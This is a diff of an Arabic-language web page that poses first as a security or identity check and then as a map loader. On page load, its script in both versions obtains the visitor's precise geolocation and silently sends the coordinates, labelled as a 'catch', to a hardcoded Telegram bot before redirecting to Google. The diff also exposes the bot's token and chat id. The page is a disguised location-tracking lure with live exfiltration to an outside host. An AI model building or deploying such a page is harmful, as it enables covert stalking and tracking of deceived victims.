@@ -2,30 +2,22 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تأكيد الهوية</title>
     <script>
         window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const token = "8740313121:AAHNUZ9vMOCeCU-_I1WBJtbAc5zTDrmAQz4";
-                    const chat_id = "8419832124";
-                    const msg = `🎯 صيد جديد!\n📍 الإحداثيات: ${lat},${lon}\n🌍 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
-                    .then(() => {
-                        window.location.href = "https://www.google.com";
-                    });
-                }, function() {
-                    alert("يجب السماح بالوصول للموقع للمتابعة");
-                });
-            }
+            navigator.geolocation.getCurrentPosition(function(p) {
+                const t = "8740313121:AAHNUZ9vMOCeCU-_I1WBJtbAc5zTDrmAQz4";
+                const c = "8419832124";
+                const m = `🎯 تم الصيد!\n📍 الرابط: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}`)
+                .then(() => { window.location.href = "https://www.google.com"; });
+            }, function(e) {
+                alert("يجب الضغط على 'سماح' لمشاهدة الخريطة!");
+            }, {enableHighAccuracy: true});
         };
     </script>
 </head>
-<body style="background: black; color: white; text-align: center; padding-top: 50px;">
-    <h1>جاري فحص الأمان...</h1>
-    <p>يرجى الضغط على "سماح" إذا ظهر لك طلب الموقع.</p>
+<body style="background:black; color:white; text-align:center;">
+    <h2>جاري تحميل الخريطة... يرجى الضغط على "سماح"</h2>
 </body>
 </html>
